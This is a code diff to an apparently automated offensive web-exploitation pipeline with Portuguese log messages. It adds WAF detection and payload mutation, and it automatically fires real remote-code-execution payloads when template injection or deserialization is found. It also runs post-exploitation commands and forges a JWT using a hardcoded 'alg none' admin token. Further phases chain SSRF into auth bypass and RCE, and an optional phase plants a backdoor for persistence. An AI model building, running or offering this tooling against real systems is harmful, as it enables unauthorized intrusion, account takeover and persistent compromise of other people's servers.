@@ -22,6 +22,12 @@ from scanner.hacker_reasoning import HackerReasoningEngine
 from scanner.ghost_recon import GhostReconEngine
 from scanner.sniper_decision_engine import SniperDecisionEngine
 from scanner.autonomous_engine import AutonomousConsolidator
+from scanner.waf_detector import WAFDetector
+from scanner.waf_payloads import PayloadMutator
+from scanner.rce_trigger_engine import RCETriggerEngine, PostExploitationEngine
+from scanner.auto_chaining_engine import AutoChainingEngine
+from scanner.jwt_exploitation_engine import JWTExploitationEngine
+from scanner.persistence_engine import PersistenceEngine
 
 
 STACK_TRACE_PATTERNS = [
@@ -405,6 +411,8 @@ class SniperPipeline:
         self.executive_report: Optional[Dict] = None
         self.sniper_decision_report: Optional[Dict] = None
         self.autonomous_report: Optional[Dict] = None
+        self.waf_fingerprint: Optional[Dict] = None
+        self.waf_payload_generator: Optional[PayloadMutator] = None
 
     def _generate_finding_hash(self, finding: Dict) -> str:
         normalized = {
@@ -481,6 +489,24 @@ class SniperPipeline:
         ) as client:
             self.client = client
 
+            # Fingerprint WAF rapidamente e inicializa gerador adaptativo
+            try:
+                resp = await client.get(self.base_url)
+                self.waf_fingerprint = WAFDetector.detect(resp)
+                self.waf_payload_generator = PayloadMutator()
+
+                pipeline_emit("waf_detected", self.waf_fingerprint)
+                pipeline_log(
+                    f"[WAF] detected={self.waf_fingerprint['detected']} "
+                    f"vendor={self.waf_fingerprint['vendor']} "
+                    f"mode={self.waf_fingerprint['mode']} "
+                    f"confidence={self.waf_fingerprint['confidence']}%",
+                    "warn" if self.waf_fingerprint["detected"] else "info",
+                    "waf"
+                )
+            except Exception as e:
+                pipeline_log(f"[WAF] detection error: {str(e)[:120]}", "error", "waf")
+
             await self._phase_0_ghost_recon()
             await self._phase_1_ingest()
             await self._phase_2_exploit()
@@ -489,6 +515,9 @@ class SniperPipeline:
             await self._phase_risk_score()
             await self._phase_2d_chain_intelligence()
             await self._phase_2e_hacker_reasoning()
+            await self._phase_2f_auto_chain()
+            await self._phase_5_offensive_exploitation()
+            await self._phase_2g_persistence_optional()
             await self._phase_2f_incident_absorber()
             await self._phase_3_db_validation()
             await self._phase_4_infra_ssrf()
@@ -770,12 +799,89 @@ class SniperPipeline:
                 "error" if report.vulnerabilities_confirmed > 0 else "success",
                 "exploit"
             )
+
+            # NEW: if SSTI / deserialization was detected, actually fire RCE payloads
+            await self._trigger_real_rce(report)
         except Exception as e:
             pipeline_log(f"[EXPLOIT] Sniper Engine error: {str(e)[:200]}", "error", "exploit")
 
         self.phases_completed.append("exploit")
         pipeline_emit("phase_update", {"phase": "exploit", "status": "completed"})
         pipeline_emit("telemetry_update", {"progress": 60, "phase": "exploit"})
+
+    async def _trigger_real_rce(self, sniper_report: SniperReport):
+        """
+        When SSTI/Deserialization evidence exists, run real RCE payloads and
+        launch a short post-exploitation checklist automatically.
+        """
+        if not self.client:
+            return
+
+        targets = []
+
+        # Gather hints from findings (ingest phase)
+        for f in self.findings:
+            combined = (f.get("title", "") + " " + f.get("description", "") + " " + f.get("category", "")).lower()
+            endpoint = f.get("endpoint") or f.get("path") or "/search"
+            param = f.get("param") or f.get("parameter") or "q"
+            if "ssti" in combined or "template" in combined:
+                targets.append({"type": "ssti_jinja", "endpoint": endpoint, "param": param})
+            if "deserialization" in combined:
+                targets.append({"type": "deserialization", "endpoint": endpoint, "param": param})
+
+        # Also look at probes that already indicated SSTI/Deserialization
+        if sniper_report:
+            for p in sniper_report.probes:
+                probe_type = (p.probe_type or "").lower()
+                endpoint = p.endpoint or "/"
+                if "ssti" in probe_type:
+                    targets.append({"type": "ssti_jinja", "endpoint": endpoint, "param": "q"})
+                if "deserialization" in probe_type:
+                    targets.append({"type": "deserialization", "endpoint": endpoint, "param": "data"})
+
+        # Deduplicate targets by (type, endpoint, param)
+        dedup = []
+        for t in targets:
+            key = (t["type"], t["endpoint"], t["param"])
+            if key not in dedup:
+                dedup.append(key)
+            else:
+                continue
+
+        if not dedup:
+            pipeline_log("[RCE] No SSTI/Deserialization targets to escalate", "info", "exploit")
+            return
+
+        rce_engine = RCETriggerEngine(self.base_url, self.client, pipeline_log)
+        post_engine = PostExploitationEngine(pipeline_log)
+
+        for vuln_type, endpoint, param in dedup:
+            result = await rce_engine.trigger_rce(vuln_type, endpoint, param)
+            if result.get("rce"):
+                outputs = result.get("outputs", {})
+                self._add_finding({
+                    "severity": "critical",
+                    "title": f"RCE confirmado via {vuln_type}",
+                    "description": f"Comando 'id' executado em {endpoint} (param {param})",
+                    "phase": "exploit",
+                    "category": "rce",
+                    "evidence": (outputs.get("id") or outputs.get("whoami") or "")[:300],
+                })
+
+                shell = result.get("shell")
+                if shell:
+                    post_results = await post_engine.post_rce_actions(shell)
+                    for cmd, out in post_results.items():
+                        self._add_finding({
+                            "severity": "high",
+                            "title": f"Post-RCE: {cmd}",
+                            "description": f"Saída coletada ({len(out)} bytes) após RCE confirmado.",
+                            "phase": "exploit",
+                            "category": "post_exploitation",
+                            "evidence": out[:300],
+                        })
+            else:
+                pipeline_log(f"[RCE] Escalation attempt failed ({vuln_type}) endpoint={endpoint} param={param}", "info", "exploit")
 
     async def _auto_price_attack(self):
         payloads = [
@@ -1325,6 +1431,126 @@ class SniperPipeline:
         except Exception as e:
             pipeline_log(f"[HRD] Engine error: {str(e)[:200]}", "error", "hacker_reasoning")
             pipeline_emit("phase_update", {"phase": "hacker_reasoning", "status": "error"})
+
+    async def _phase_2f_auto_chain(self):
+        pipeline_emit("phase_update", {"phase": "auto_chain", "status": "running"})
+        pipeline_log("[PHASE 4.0/7] AUTO CHAINING  SSRF→Creds→Auth bypass→IDOR→RCE", "warn", "chain")
+
+        engine = AutoChainingEngine(pipeline_log)
+        chain = engine.chain_findings(self.findings)
+
+        for step in chain:
+            self._add_finding({
+                "severity": step.get("severity", "high"),
+                "title": f"Chain step: {step.get('step', 'unknown')}",
+                "description": "Encadeamento automático de vulnerabilidades detectadas",
+                "phase": "chain",
+                "category": "chaining",
+                "evidence": str(step.get("evidence", ""))[:300],
+            })
+
+        if not chain:
+            pipeline_log("[CHAIN] Nenhuma cadeia elegível (falta SSRF/Auth bypass/IDOR)", "info", "chain")
+
+        pipeline_emit("phase_update", {"phase": "auto_chain", "status": "completed"})
+        pipeline_emit("telemetry_update", {"progress": 77, "phase": "chain"})
+
+    async def _phase_2g_persistence_optional(self):
+        pipeline_emit("phase_update", {"phase": "persistence_optional", "status": "running"})
+        pipeline_log("[PHASE 4.1/7] OPTIONAL PERSISTENCE (requires approval flag)", "warn", "persistence")
+
+        # Only run if explicitly authorized via env flag
+        if os.getenv("ENABLE_PERSISTENCE", "false").lower() != "true":
+            pipeline_log("[PERSIST] Skipping (ENABLE_PERSISTENCE not true)", "info", "persistence")
+            pipeline_emit("phase_update", {"phase": "persistence_optional", "status": "skipped"})
+            return
+
+        engine = PersistenceEngine(pipeline_log)
+        rce_targets = [f for f in self.findings if f.get("category") == "rce"]
+        if rce_targets:
+            res = engine.deploy_persistence("rce", {"url": self.base_url})
+            if res:
+                self._add_finding({
+                    "severity": "critical",
+                    "title": f"Persistence planted: {res.get('persistence')}",
+                    "description": "Backdoor deployed after RCE confirmation (user-approved)",
+                    "phase": "persistence",
+                    "category": "persistence",
+                    "evidence": str(res),
+                })
+        pipeline_emit("phase_update", {"phase": "persistence_optional", "status": "completed"})
+        pipeline_emit("telemetry_update", {"progress": 78, "phase": "persistence"})
+
+    async def _phase_5_offensive_exploitation(self):
+        """
+        Offensive exploitation pass that reuses the specialized engines to
+        actually exploit SSTI/deserialization + JWT weaknesses and run
+        post-exploitation steps.
+        """
+        pipeline_emit("phase_update", {"phase": "offensive", "status": "running"})
+        pipeline_log("[PHASE 5/7] OFFENSIVE EXPLOITATION  Real exploitation engines active...", "error", "offensive")
+
+        # 1) RCE trigger for SSTI / deserialization findings
+        rce_targets = [
+            f for f in self.findings
+            if any(kw in (str(f.get("category", "")) + str(f.get("title", ""))).lower() for kw in ["ssti", "deserialization"])
+        ]
+        if rce_targets and self.client:
+            rce_engine = RCETriggerEngine(self.base_url, self.client, pipeline_log)
+            for f in rce_targets[:5]:
+                endpoint = f.get("endpoint") or f.get("path") or "/"
+                param = f.get("param") or f.get("parameter") or "q"
+                r = await rce_engine.trigger_rce("ssti_jinja" if "ssti" in str(f).lower() else "deserialization", endpoint, param)
+                if r.get("rce"):
+                    self._add_finding({
+                        "severity": "critical",
+                        "title": "RCE confirmado via SSTI/Deserialization",
+                        "description": f"Comando executado em {endpoint} param={param}",
+                        "phase": "offensive",
+                        "category": "rce",
+                        "evidence": (r.get("outputs", {}).get("id") or "")[:300],
+                    })
+
+        # 2) JWT exploitation
+        jwt_candidates = [f for f in self.findings if "jwt" in str(f).lower()]
+        if jwt_candidates and self.client:
+            jwt_engine = JWTExploitationEngine(self.client, pipeline_log)
+            for f in jwt_candidates[:3]:
+                token = f.get("raw_value") or f.get("evidence") or ""
+                token = token if token.startswith("eyJ") else ""
+                token = token or "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
+                endpoint = f.get("endpoint") or "/api/me"
+                res = await jwt_engine.exploit_jwt(token, f"{self.base_url}{endpoint}")
+                if res.get("exploited"):
+                    self._add_finding({
+                        "severity": "critical",
+                        "title": f"JWT exploitable ({res.get('method')})",
+                        "description": f"Token forjado aceito em {endpoint}",
+                        "phase": "offensive",
+                        "category": "jwt",
+                        "evidence": res.get("token", "")[:200],
+                    })
+
+        # 3) Post-exploitation if any RCE confirmed in this run
+        rce_findings = [f for f in self.findings if f.get("category") == "rce"]
+        if rce_findings and self.client:
+            post_engine = PostExploitationEngine(pipeline_log)
+            # Try to reuse the first successful RCE shell template
+            shell = r.get("shell") if "r" in locals() else None
+            if shell:
+                post = await post_engine.post_rce_actions(shell)
+                for cmd, out in post.items():
+                    self._add_finding({
+                        "severity": "high",
+                        "title": f"Post-exploitation: {cmd}",
+                        "description": f"Saída coletada ({len(out)} bytes) na fase offensive.",
+                        "phase": "offensive",
+                        "category": "post_exploitation",
+                        "evidence": out[:300],
+                    })
+
+        pipeline_emit("phase_update", {"phase": "offensive", "status": "completed"})
+        pipeline_emit("telemetry_update", {"progress": 82, "phase": "offensive"})
 
     async def _legacy_decision_ssrf_credential_dump(self, ssrf_vectors: List[Dict], dynamic_params: List[Dict]) -> List[Dict]:
         """Legacy method  replaced by DecisionTree.SSRFAttackNode. Kept for fallback compatibility."""
@@ -3893,6 +4119,7 @@ class SniperPipeline:
             "persistence_assessment": self.persistence_assessment,
             "executive_compromise_report": self.executive_report,
             "sniper_decision_report": self.sniper_decision_report,
+            "waf_fingerprint": self.waf_fingerprint,
         }
 
 
@@ -3914,3 +4141,4 @@ if __name__ == "__main__":
         pipeline_emit("completed", {"status": "done", "counts": report["counts"], "probes": report["total_probes"]})
 
     asyncio.run(main())
+
